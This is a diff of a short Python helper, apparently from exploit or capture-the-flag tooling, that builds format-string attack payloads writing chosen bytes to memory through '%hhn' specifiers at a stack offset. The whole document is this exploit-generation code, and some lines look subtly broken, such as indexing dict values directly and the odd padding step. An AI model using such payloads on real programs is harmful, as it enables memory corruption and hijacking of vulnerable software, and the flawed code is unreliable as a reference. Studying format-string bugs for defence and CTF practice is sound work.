@@ -1,4 +1,4 @@
-payload = ""
+from zp import pack
 
 def _fmtstr(prev_size,val,index):
     result = ""
@@ -8,13 +8,19 @@ def _fmtstr(prev_size,val,index):
         result += ""
     else:
         result += "%" + str(val - prev_size +256 ) + "c"
-    result += "%" + str(idx) + "$hhn"
+    result += "%" + str(index) + "$hhn"
     return result
 
-def fmtstr(prev_size,data,write_num,write_size):
-    for loop in range(len(list(data.keys()))):
+def fmtstr(offset,data,write_num,write_size):
+    payload = ""
+    prev_size = 0
+    for loop in range(len(data.keys())):
+        value = data.values()[loop]
         for i in range(write_num):
-            payload += fmt(prev,(target >> i*8) & 0xff,22+i)
-            prev = (target >> i*8) & 0xff
+            payload += _fmtstr(prev_size,(value >> i*8) & 0xff,offset+i)
+            prev_size = (value >> i*8) & 0xff
+        offset += write_num
+    payload = payload.ljust(len(payload) + len(payload)%8,"A")
+    return payload
 
 
